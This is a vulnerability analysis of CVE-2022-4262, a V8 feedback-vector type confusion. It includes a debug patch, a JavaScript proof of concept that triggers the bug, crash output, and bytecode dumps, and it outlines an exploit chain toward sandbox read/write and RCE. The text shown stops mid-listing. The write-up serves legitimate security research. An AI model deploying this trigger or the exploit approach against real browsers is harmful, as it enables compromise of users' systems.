# CVE-2022-4262

Author: Jack Ren ([@bjrjk](https://github.com/bjrjk))

This V8 CVE is the one of the most difficult and non-trivial type confusion vulnerability I've ever met since I started to study JavaScript engine vulnerabilities. It has spent me more than two full weeks and numerous spare time to analyze this bug and try to find an exploit. However, I was only able to accomplish a [root cause analysis (in Chinese)<sup>1</sup>](#RefList-1) because of having no time to investigate this vulnerability anymore. That's really a pity I didn't have time to figure out the exploit myself.

However, the pity is finally settled down after [@mistymntncop](https://github.com/mistymntncop) using his brilliant intelligence to develop an [exploit<sup>2</sup>](#RefList-2). This exploit is so tricky and artful that I cannot suppress my thrilled feeling! @mistymntncop is really an V8 codebase auditing genius to develop this fragile exploit!

In order to preserve his precious thought and commemorate my time on this unruly CVE, I decide to write a full analysis on the vulnerability. This write up will divide the whole exploit process into different stages, each described in a section in this article, to make you readers easier to understand.

The article will be mainly made up of the following [6](TODO: Number of Technical Section) technical sections:
- [Overview](#overview): Because of the complicated root cause and the long exploit chain, an overview will be presented to help you have a rough understanding of this CVE and its possible attack impacts.
- [Proof of Concept](#proof-of-concept): This section delivers information about proof of concept, its runtime output and its sketchy runtime logic.
- [Root Cause Analysis](#root-cause-analysis): We'll figure out the root cause of this uncommon type confusion in function's feedback vector. This vulnerability is due to strictness mismatch in execution context, i.e. scope.
- [Simplified Exploit](#simplified-exploit): A simplified exploit will be provided and introduced to readers to make a better understanding of the formal exploit's key point.
- [Exploit Primitive in V8 Sandbox](#exploit-primitive-in-v8-sandbox): This section contains the JavaScript source utilizing the vulnerability to achieve Address-Of, Fake-Object, Read & Write Primitive in V8 Sandbox. Meanwhile it will also describe why the source's capable to do so.
- [Exploit for RCE (Possibly)](#exploit-for-rce): The insight to enlarge primitives in V8 Sandbox to Remote Code Execution in this specific vulnerability version of V8 will be presented.

Each section, except Overview, will contain multiple subsections. They are typically starting with background knowledges, then source code (PoC, Exploit) or patch, which is followed by a technology analysis upon it. Finally, a conclusion will summarize the whole section.

Now, let's start with Overview for CVE-2022-4262!

# Overview

In order to reduce V8's memory usage, a mechanism called [*Bytecode<sup>(1)</sup> flushing*<sup>3</sup>](#RefList-3) is implemented on V8 engine. The core idea of *Bytecode flushing* is to jettison unused function bytecodes when every major (mark-compact) GC<sup>(2)</sup> occured, as bytecode will consume lots of memory. However, the function's feedback vector<sup>(3)</sup> won't be recycled when the bytecode is being recycled.

There exists two execution mode for JavaScript, respectively named [*strict mode*<sup>4</sup>](#RefList-4) and *non-strict mode*, i.e. *sloppy mode*. From the very beginning of the proposing of JavaScript language to the publish of ECMAScript<sup>(4)</sup> 5 standard, all JavaScript code runs in *sloppy mode*. *Strict mode* is introduced by this new standard to strictify the semantic of JavaScript language. Due to the emerging of *strict mode*, a set of flags must be set up for [scopes<sup>5</sup>](#RefList-5) to indicate code in this scope runs in which mode.

[`eval()`<sup>6</sup>](#RefList-6) is one of the most important JavaScript builtin function. It provides the capability to dynamically execute JavaScript by passing a string argument of JavaScript code. The semantic of `eval` function is different between *strict mode* and *sloppy mode*. In *sloppy mode*, `eval` may introduce new variables into the surrounding scope. But in *strict mode*, `eval` won't introduce any new variables into the surrounding scope anymore[<sup>7</sup>](#RefList-7). In order to record whether the feature is enabled, a boolean field named `sloppy_eval_can_extend_vars_` is defined in class `Scope`.

Because of the invoking of GC in vulnerability PoC, the bytecode of PoC will be jettisoned, then recompiled immediately after GC finished. Theoretically, the bytecode before and after GC should be consistent. However, due to the implementation error of JavaScript code parser, the value of `sloppy_eval_can_extend_vars_` field in a specific `Scope` instance is inconsistent across two bytecode generation process, which lead to the inconsistency of bytecode.

The feedback vector's content is reserved between GC. However, that's not what GC does to bytecode. Due to the inconsistency of bytecode across GC, different kind of bytecode may correspond to the same feedback slot position in feedback vector, in which contains old bytecode's profile information. In that case, the feedback slot handler of new bytecode will try to decode information of old type with a totally different format, this is the time when type confusion happened.

@mistymntncop mined out a brand-new method with his brilliant intelligence to enlarge the seemingly innocent feedback slot type confusion into an exploitable one. He found a feedback slot type named `SetNamedStrict`. The `SetNamedStrict` feedback slot take up two elements in feedback vector. The `SetNamedStrict` feedback slot's contents can be crafted by the attacker via the vulnerability to be in one of the [monomorphic<sup>9</sup>](#RefList-9) state, with the first element containing the [map<sup>10, (5)</sup>](#RefList-10) of [receiver](#RefList-11)'s original map, and the second element containing the map to which the receiver will transition. In other words, when the bytecode corresponding to the feedback slot is executing and the receiver's original map is equivalent to the first element, the receiver's map will be transited from the first element to the second element. What the most important thing is while the transition of map is happening, **the resizing of JavaScript object cell won't happen**. The reason why `SetNamedStrict` feedback can be utilized to transit object into a different map without object cell's change is because the feedback vector data is considered trusted. The V8 engine won't check the backpointer from the map because the point of [inline cache<sup>8, (3)</sup>](#RefList-8) is to speed things up and avoid consulting the transition tree. This indicate an Out of Bound (OOB) access (both R/W) can be executed to read or write other JavaScript object's metadata, e.g. array length. Until now, a limited primitive is formed.

The left things should be routines for V8 senior hackers. Two array with different type, i.e. `HOLEY_DOUBLE_ELEMENT` and `HOLEY_ELEMENT`, can be allocated adjacently. We use the above limited primitive to modify first array's length to allow its OOB access to the second array. Then the Address-Of and Fake-Object primitive can be achieved. Finally, we fake JavaScript Object in real JavaScript object's memory to get V8 Sandbox Read / Write primitives.

> (1) Bytecode is an intermediate representation of the original JavaScript source, which is generated and used by V8 to accelerate the execution speed of JavaScript source. <br/>
> (2) GC, also named garbage collection, is to free unused object in currrent execution context to relieve memory pressure and reserve space for other new objects. <br/>
> (3) Feedback vector is a V8 terminology indicating a data structure for the purpose of [Inline Cache (IC)<sup>8</sup>](#RefList-8). The feedback vector is the data-driven[<sup>14</sup>](#RefList-14) form of IC. JavaScript engines use ICs to memorize information on where to find properties on objects, to reduce the number of expensive lookups. Some types of bytecode may use feedback slots in feedback vector to accelerate their execution, while others not. <br/>
> (4) ECMAScript is the language specification of JavaScript. <br/>
> (5) Map is a V8 terminology indicating a data structure storing how a JavaScript object is represented in raw memory.

# Environmental Setup

## V8 Reproduce Commit

- Proof of Concept & Root Cause Analysis
    - Before Patch: `323ada0128db42088ee76dbeefa577fd07bfd7df`
    - After Patch: `27fa951ae4a3801126e84bc94d5c82dd2370d18b`
- Exploit: `18865d6af0404f2d2aeb1c99dd73503364ce0967`

To reproduce Simplified Exploit, you should append `v8_expose_memory_corruption_api = true` to  `args.gn` in build root directory[<sup>12</sup>](#RefList-12).

To know how to build V8, please refer to [Building V8 from source<sup>13</sup>](#RefList-13).

## d8 Command Line Options

- Proof of Concept & Root Cause Analysis: `out/x64.debug/d8 --allow-natives-syntax --print-bytecode --print-scopes --trace-flush-bytecode --trace-gc --trace-lazy --no-concurrent_recompilation --no-concurrent-sweeping PoC.js`
- Exploit: `./d8 --allow-natives-syntax exploit.js`

# Proof of Concept

## Sources

### Debug Patch Diff

In order to have an intuitive presentation of feedback vector when debugging, please save the following patch with filename `debug.patch`, then apply it with command `git apply debug.patch`.

```diff
diff --git a/src/builtins/ic-callable.tq b/src/builtins/ic-callable.tq
index a9cc43c716b..9df2305ad55 100644
--- a/src/builtins/ic-callable.tq
+++ b/src/builtins/ic-callable.tq
@@ -100,6 +100,7 @@ macro CollectCallFeedback(
   const feedbackVector =
       Cast<FeedbackVector>(maybeFeedbackVector) otherwise return;
   IncrementCallCount(feedbackVector, slotId);
+  Print("vector", feedbackVector);
 
   try {
     const feedback: MaybeObject =
diff --git a/src/objects/feedback-vector.cc b/src/objects/feedback-vector.cc
index 65321d50969..ebd282c539e 100644
--- a/src/objects/feedback-vector.cc
+++ b/src/objects/feedback-vector.cc
@@ -747,7 +747,7 @@ InlineCacheState FeedbackNexus::ic_state() const {
           if (heap_object.IsFeedbackCell()) {
             return InlineCacheState::POLYMORPHIC;
           }
-          CHECK(heap_object.IsJSFunction() || heap_object.IsJSBoundFunction());
+          // CHECK(heap_object.IsJSFunction() || heap_object.IsJSBoundFunction());
         }
         return InlineCacheState::MONOMORPHIC;
       } else if (feedback->GetHeapObjectIfStrong(&heap_object) &&
```

### PoC Source

```javascript
GC = function () {
    try {
        for (let i = 0; i < 6; i++) {
            let ab = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        }
    } catch (e) {
        print(e);
    }
};
for (let j = 0; j < 13; j++) {
    function dummy() { }
    {
        ((a = class b3 {
            [({ c: eval(), d: dummy(eval), e: dummy(eval) } ? 0 : (aa = 0xdeadbbed, bb = 0xdeadbeef))]
        }) => { })();
    }
    if (j == 11) {
        GC();
    }
}
```

## Background Knowledges

### ComputedPropertyName Syntax

[Computed Property Name<sup>15</sup>](#RefList-15) is a new syntax introduced in ES6 to allow you dynamically calculate expression as a property name in object initializer. The following are examples.

```javascript
let prop = "p";
class C {
    [prop] = 1;
    [prop + "1"] = 2;
}
console.log(new C());

// C {p: 1, p1: 2}
```

```javascript
// Among the next line, "0" is a property with initial value `undefined`
> class b3 {"0" = undefined} // or class b3 {0 = undefined}
undefined
> new b3()
b3 {0: undefined}

// `undefined` can be omitted
> class b3 {0}
undefined
> new b3()
b3 {0: undefined}

// "[0]" is a `ComputedPropertyName` syntax unit, which is equivalent to "0"
> class b3 {[0]}
undefined
> new b3()
b3 {0: undefined}
```

### Default Parameter for Arrow Function

```javascript
> ((a = 1) => { return a; })();
1
```

### Conditional (Ternary) Operator

When evaluating [Conditional Operator<sup>16</sup>](#RefList-16), if the `ShortCircuitExpression` is an object, the condition will always considered to be true. 

```javascript
> ({ c: undefined, d: undefined, e: undefined }) ? 1 : (aa = 1, bb = 2)
1
```

## Execution Result and Brief Analysis

### Crash Point

Through the following message, we could find that type confusion occured between `PropertyCell` and `FeedbackCell`.

```
# Fatal error in ../../src/objects/object-type.cc, line 81
# Type cast failed in CAST(GetHeapObjectAssumeWeak(maybe_weak_ref, try_handler)) at ../../src/ic/accessor-assembler.cc:3371
  Expected PropertyCell but found 0x3f890025a9b1: [FeedbackCell] in OldSpace
 - map: 0x3f8900002b11 <Map[12](FEEDBACK_CELL_TYPE)>
 - many closures
 - value: 0x3f890025adc9 <FeedbackVector[0]>
 - interrupt_budget: 67554

#
#
#
#FailureMessage Object: 0x7fffe1cb2a70
==== C stack trace ===============================

    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7efde69bef1e]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libplatform.so(+0x4ad9d) [0x7efde6914d9d]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x16f) [0x7efde698db9f]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8.so(v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)+0x836b) [0x7efde4e37b4b]
    [0x7efd7fdc2f27]
```

Via code auditing to function near `src/ic/accessor-assembler.cc:3371`, we'll found the type confused object is located in feedback vector. As the object failed to be casted named `maybe_weak_ref` is got from `LoadFeedbackVectorSlot(vector, slot)` at line 3363.

```cpp
void AccessorAssembler::LoadGlobalIC_TryPropertyCellCase(
    TNode<FeedbackVector> vector, TNode<TaggedIndex> slot,
    const LazyNode<Context>& lazy_context, ExitPoint* exit_point,
    Label* try_handler, Label* miss) {
  Comment("LoadGlobalIC_TryPropertyCellCase");

  Label if_lexical_var(this), if_property_cell(this);
  TNode<MaybeObject> maybe_weak_ref = LoadFeedbackVectorSlot(vector, slot); // <- Line 3363
  Branch(TaggedIsSmi(maybe_weak_ref), &if_lexical_var, &if_property_cell);

  BIND(&if_property_cell);
  {
    // Load value or try handler case if the weak reference is cleared.
    CSA_DCHECK(this, IsWeakOrCleared(maybe_weak_ref));
    TNode<PropertyCell> property_cell =
        CAST(GetHeapObjectAssumeWeak(maybe_weak_ref, try_handler)); // <- Line 3371 [!]
    TNode<Object> value =
        LoadObjectField(property_cell, PropertyCell::kValueOffset);
    GotoIf(TaggedEqual(value, TheHoleConstant()), miss);
    exit_point->Return(value);
  }

  // ...
```

### Feedback Vector

As the type confusion occurs in feedback vector, we need to carefully inspect contents in feedback vector. Mentioned that the vulnerability is triggered after finished `GC()`, we inspect the content of feedback vector both before and after garbage collection.

#### Content before GC

```
vector: DebugPrint: 0x3fe00025b191: [FeedbackVector] in OldSpace
 - map: 0x3fe00000273d <Map(FEEDBACK_VECTOR_TYPE)>
 - length: 21
 - shared function info: 0x3fe00025a59d <SharedFunctionInfo>
 - no optimized code
 - tiering state: TieringState::kNone
 - maybe has maglev code: 0
 - maybe has turbofan code: 0
 - invocation count: 4
 - profiler ticks: 0
 - closure feedback cell array: 0x3fe00025aa19: [ClosureFeedbackCellArray] in OldSpace
 - map: 0x3fe000002981 <Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)>
 - length: 2
           0: 0x3fe00025aa29 <FeedbackCell[many closures]>
           1: 0x3fe00025aa35 <FeedbackCell[many closures]>

 - slot #0 Literal  {
     [0]: 0x3fe00025b2bd <AllocationSite>
  }
 - slot #1 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>> {
     [1]: [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>>
     [2]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #3 Call MONOMORPHIC {
     [3]: [weak] 0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>
     [4]: 12
  }
 - slot #5 DefineNamedOwn MONOMORPHIC {
     [5]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [6]: 3604480
  }
 - slot #7 Call POLYMORPHIC {
     [7]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [8]: 12
  }
 - slot #9 DefineNamedOwn MONOMORPHIC {
     [9]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [10]: 4653120
  }
 - slot #11 Call POLYMORPHIC {
     [11]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [12]: 12
  }
 - slot #13 DefineNamedOwn MONOMORPHIC {
     [13]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [14]: 5701760
  }
 - slot #15 StoreGlobalStrict UNINITIALIZED {
     [15]: [cleared]
     [16]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #17 StoreGlobalStrict UNINITIALIZED {
     [17]: [cleared]
     [18]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #19 SetNamedStrict POLYMORPHIC
   [weak] 0x3fe00025b22d <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [weak] 0x3fe00025b301 <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [19]: 0x3fe00010d249 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     [20]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
0x3fe00000273d: [Map] in ReadOnlySpace
 - type: FEEDBACK_VECTOR_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x3fe0000023e1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x3fe0000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x3fe000002261 <null>
 - constructor: 0x3fe000002261 <null>
 - dependent code: 0x3fe0000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

#### Content after GC

```
vector: DebugPrint: 0x3fe00025b191: [FeedbackVector] in OldSpace
 - map: 0x3fe00000273d <Map(FEEDBACK_VECTOR_TYPE)>
 - length: 21
 - shared function info: 0x3fe00025a59d <SharedFunctionInfo>
 - no optimized code
 - tiering state: TieringState::kNone
 - maybe has maglev code: 0
 - maybe has turbofan code: 0
 - invocation count: 5
 - profiler ticks: 0
 - closure feedback cell array: 0x3fe00025aa19: [ClosureFeedbackCellArray] in OldSpace
 - map: 0x3fe000002981 <Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)>
 - length: 2
           0: 0x3fe00025aa29 <FeedbackCell[many closures]>
           1: 0x3fe00025aa35 <FeedbackCell[many closures]>

 - slot #0 Literal  {
     [0]: 0x3fe00025b2bd <AllocationSite>
  }
 - slot #1 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>> {
     [1]: [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>>
     [2]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #3 Call MONOMORPHIC {
     [3]: [weak] 0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>
     [4]: 16
  }
 - slot #5 DefineNamedOwn MONOMORPHIC {
     [5]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [6]: 3604480
  }
 - slot #7 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x3fe00025a9b1 <FeedbackCell[many closures]>) {
     [7]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [8]: 12
  }
 - slot #9 Call MONOMORPHIC {
     [9]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [10]: 4653120
  }
 - slot #11 DefineNamedOwn MONOMORPHIC {
     [11]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [12]: 12
  }
 - slot #13 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>) {
     [13]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [14]: 5701760
  }
 - slot #15 Call MONOMORPHIC {
     [15]: [cleared]
     [16]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #17 DefineNamedOwn MONOMORPHIC {
     [17]: [cleared]
     [18]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #19 SetNamedStrict POLYMORPHIC
   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [19]: 0x3fe00025c0c5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     [20]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
0x3fe00000273d: [Map] in ReadOnlySpace
 - type: FEEDBACK_VECTOR_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x3fe0000023e1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x3fe0000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x3fe000002261 <null>
 - constructor: 0x3fe000002261 <null>
 - dependent code: 0x3fe0000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

#### Content Diff across GC

Via the content diff below, we could find that many feedback slot's type has changed. Especially, we should focus on slot #7.

Through observation, we could find that the type of slot #7 changed from `Call POLYMORPHIC` to `LoadGlobalNotInsideTypeof MONOMORPHIC` while contents corresponding to slot #7 (feedback vector element `[7]` & `[8]`) remain unchanged. What's more, a tag `<unexpected>` was added to slot #7's description because this isn't any desirable behaviour by the engine developer.

As slot #1's content remains consistent, we could confirm it's a feedback slot with normal behaviour. Mentioning that slot #1 and slot #7 has the same type `LoadGlobalNotInsideTypeof MONOMORPHIC`, their content type should be the same. The first feedback vector element of slot #1, `[1]`, is with content type `PropertyCell`. So the first feedback vector element of slot #7, `[7]`, should also be `PropertyCell` type, but its content type is `FeedbackCell` in reality. That indicate a type confusion occurs in slot #7, which is consistent with the crash message.

![](images/PoC_FeedbackVector_Diff.png)

### Bytecode

As the feedback vector, which is for the purpose of inline cache, is associated with bytecode closely, we'll also need to examine bytecode across GC.

#### Bytecode before GC

```
[generated bytecode for function:  (0x3fe00025a59d <SharedFunctionInfo>)]
Bytecode length: 141
Parameter count 2
Register count 10
Frame size 80
Bytecode age: 0
         0x3fe00025a87a @    0 : 83 00 01          CreateFunctionContext [0], [1]
         0x3fe00025a87d @    3 : 1a fa             PushContext r0
         0x3fe00025a87f @    5 : 10                LdaTheHole
         0x3fe00025a880 @    6 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a882 @    8 : 0b 03             Ldar a0
         0x3fe00025a884 @   10 : 9d 7d             JumpIfNotUndefined [125] (0x3fe00025a901 @ 135)
         0x3fe00025a886 @   12 : 81 01             CreateBlockContext [1]
         0x3fe00025a888 @   14 : 1a f9             PushContext r1
         0x3fe00025a88a @   16 : 10                LdaTheHole
         0x3fe00025a88b @   17 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a88d @   19 : 10                LdaTheHole
         0x3fe00025a88e @   20 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025a890 @   22 : 10                LdaTheHole
         0x3fe00025a891 @   23 : bf                Star5
         0x3fe00025a892 @   24 : 80 03 00 02       CreateClosure [3], [0], #2
         0x3fe00025a896 @   28 : c2                Star2
         0x3fe00025a897 @   29 : 13 02             LdaConstant [2]
         0x3fe00025a899 @   31 : c1                Star3
         0x3fe00025a89a @   32 : 7c 04 00 29       CreateObjectLiteral [4], [0], #41
         0x3fe00025a89e @   36 : bd                Star7
         0x3fe00025a89f @   37 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8a2 @   40 : bc                Star8
         0x3fe00025a8a3 @   41 : 61 f2 03          CallUndefinedReceiver0 r8, [3]
         0x3fe00025a8a6 @   44 : 33 f3 06 05       DefineNamedOwnProperty r7, [6], [5]
         0x3fe00025a8aa @   48 : 14 fa 02 00       LdaContextSlot r0, [2], [0]
         0x3fe00025a8ae @   52 : bc                Star8
         0x3fe00025a8af @   53 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8b2 @   56 : bb                Star9
         0x3fe00025a8b3 @   57 : 62 f2 f1 07       CallUndefinedReceiver1 r8, r9, [7]
         0x3fe00025a8b7 @   61 : 33 f3 07 09       DefineNamedOwnProperty r7, [7], [9]
         0x3fe00025a8bb @   65 : 14 fa 02 00       LdaContextSlot r0, [2], [0]
         0x3fe00025a8bf @   69 : bc                Star8
         0x3fe00025a8c0 @   70 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8c3 @   73 : bb                Star9
         0x3fe00025a8c4 @   74 : 62 f2 f1 0b       CallUndefinedReceiver1 r8, r9, [11]
         0x3fe00025a8c8 @   78 : 33 f3 08 0d       DefineNamedOwnProperty r7, [8], [13]
         0x3fe00025a8cc @   82 : 19 f8 f6          Mov r2, r4
         0x3fe00025a8cf @   85 : 0b f3             Ldar r7
         0x3fe00025a8d1 @   87 : 97 05             JumpIfToBooleanFalse [5] (0x3fe00025a8d6 @ 92)
         0x3fe00025a8d3 @   89 : 0c                LdaZero
         0x3fe00025a8d4 @   90 : 8a 0f             Jump [15] (0x3fe00025a8e3 @ 105)
         0x3fe00025a8d6 @   92 : 13 09             LdaConstant [9]
         0x3fe00025a8d8 @   94 : 23 0a 0f          StaGlobal [10], [15]
         0x3fe00025a8db @   97 : 13 0b             LdaConstant [11]
         0x3fe00025a8dd @   99 : bd                Star7
         0x3fe00025a8de @  100 : 23 0c 11          StaGlobal [12], [17]
         0x3fe00025a8e1 @  103 : 0b f3             Ldar r7
         0x3fe00025a8e3 @  105 : 73 f4             ToName r6
         0x3fe00025a8e5 @  107 : 0b f4             Ldar r6
         0x3fe00025a8e7 @  109 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a8e9 @  111 : 65 29 00 f7 04    CallRuntime [DefineClass], r3-r6
         0x3fe00025a8ee @  116 : 0b f8             Ldar r2
         0x3fe00025a8f0 @  118 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025a8f2 @  120 : 80 0d 01 02       CreateClosure [13], [1], #2
         0x3fe00025a8f6 @  124 : c1                Star3
         0x3fe00025a8f7 @  125 : 32 f8 0e 13       SetNamedProperty r2, [14], [19]
         0x3fe00025a8fb @  129 : 1b f9             PopContext r1
         0x3fe00025a8fd @  131 : 0b f8             Ldar r2
         0x3fe00025a8ff @  133 : 8a 04             Jump [4] (0x3fe00025a903 @ 137)
         0x3fe00025a901 @  135 : 0b 03             Ldar a0
         0x3fe00025a903 @  137 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a905 @  139 : 0e                LdaUndefined
         0x3fe00025a906 @  140 : a9                Return
Constant pool (size = 15)
0x3fe00025a7fd: [FixedArray] in OldSpace
 - map: 0x3fe000002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 15
           0: 0x3fe00025a47d <ScopeInfo FUNCTION_SCOPE>
           1: 0x3fe00025a4ad <ScopeInfo CLASS_SCOPE>
           2: 0x3fe00025a7d9 <FixedArray[7]>
           3: 0x3fe00025a6d5 <SharedFunctionInfo b3>
           4: 0x3fe00025a735 <ObjectBoilerplateDescription[7]>
           5: 0x3fe000006005 <String[4]: #eval>
           6: 0x3fe0000040a5 <String[1]: #c>
           7: 0x3fe0000040b5 <String[1]: #d>
           8: 0x3fe0000040c5 <String[1]: #e>
           9: 0x3fe00025a841 <HeapNumber 3735927789.0>
          10: 0x3fe00025a37d <String[2]: #aa>
          11: 0x3fe00025a84d <HeapNumber 3735928559.0>
          12: 0x3fe00025a38d <String[2]: #bb>
          13: 0x3fe00025a70d <SharedFunctionInfo <instance_members_initializer>>
          14: 0x3fe0000071e5 <Symbol: (class_fields_symbol)>
Handler Table (size = 0)
Source Position Table (size = 0)
```

#### Bytecode after GC

```
[generated bytecode for function:  (0x3fe00025a59d <SharedFunctionInfo>)]
Bytecode length: 141
Parameter count 2
Register count 10
Frame size 80
Bytecode age: 0
         0x3fe00025c432 @    0 : 83 00 02          CreateFunctionContext [0], [2]
         0x3fe00025c435 @    3 : 1a fa             PushContext r0
         0x3fe00025c437 @    5 : 10                LdaTheHole
         0x3fe00025c438 @    6 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c43a @    8 : 0b 03             Ldar a0
         0x3fe00025c43c @   10 : 9d 7d             JumpIfNotUndefined [125] (0x3fe00025c4b9 @ 135)
         0x3fe00025c43e @   12 : 81 01             CreateBlockContext [1]
         0x3fe00025c440 @   14 : 1a f9             PushContext r1
         0x3fe00025c442 @   16 : 10                LdaTheHole
         0x3fe00025c443 @   17 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025c445 @   19 : 10                LdaTheHole
         0x3fe00025c446 @   20 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c448 @   22 : 10                LdaTheHole
         0x3fe00025c449 @   23 : bf                Star5
         0x3fe00025c44a @   24 : 80 03 00 02       CreateClosure [3], [0], #2
         0x3fe00025c44e @   28 : c2                Star2
         0x3fe00025c44f @   29 : 13 02             LdaConstant [2]
         0x3fe00025c451 @   31 : c1                Star3
         0x3fe00025c452 @   32 : 7c 04 00 29       CreateObjectLiteral [4], [0], #41
         0x3fe00025c456 @   36 : bd                Star7
         0x3fe00025c457 @   37 : 28 05 01 02       LdaLookupGlobalSlot [5], [1], [2]
         0x3fe00025c45b @   41 : bc                Star8
         0x3fe00025c45c @   42 : 61 f2 03          CallUndefinedReceiver0 r8, [3]
         0x3fe00025c45f @   45 : 33 f3 06 05       DefineNamedOwnProperty r7, [6], [5]
         0x3fe00025c463 @   49 : 27 07 02 02       LdaLookupContextSlot [7], [2], [2]
         0x3fe00025c467 @   53 : bc                Star8
         0x3fe00025c468 @   54 : 28 05 07 02       LdaLookupGlobalSlot [5], [7], [2]
         0x3fe00025c46c @   58 : bb                Star9
         0x3fe00025c46d @   59 : 62 f2 f1 09       CallUndefinedReceiver1 r8, r9, [9]
         0x3fe00025c471 @   63 : 33 f3 08 0b       DefineNamedOwnProperty r7, [8], [11]
         0x3fe00025c475 @   67 : 27 07 02 02       LdaLookupContextSlot [7], [2], [2]
         0x3fe00025c479 @   71 : bc                Star8
         0x3fe00025c47a @   72 : 28 05 0d 02       LdaLookupGlobalSlot [5], [13], [2]
         0x3fe00025c47e @   76 : bb                Star9
         0x3fe00025c47f @   77 : 62 f2 f1 0f       CallUndefinedReceiver1 r8, r9, [15]
         0x3fe00025c483 @   81 : 33 f3 09 11       DefineNamedOwnProperty r7, [9], [17]
         0x3fe00025c487 @   85 : 19 f8 f6          Mov r2, r4
         0x3fe00025c48a @   88 : 0b f3             Ldar r7
         0x3fe00025c48c @   90 : 97 05             JumpIfToBooleanFalse [5] (0x3fe00025c491 @ 95)
         0x3fe00025c48e @   92 : 0c                LdaZero
         0x3fe00025c48f @   93 : 8a 0c             Jump [12] (0x3fe00025c49b @ 105)
         0x3fe00025c491 @   95 : 13 0a             LdaConstant [10]
         0x3fe00025c493 @   97 : 2c 0b 01          StaLookupSlot [11], #1
         0x3fe00025c496 @  100 : 13 0c             LdaConstant [12]
         0x3fe00025c498 @  102 : 2c 0d 01          StaLookupSlot [13], #1
         0x3fe00025c49b @  105 : 73 f4             ToName r6
         0x3fe00025c49d @  107 : 0b f4             Ldar r6
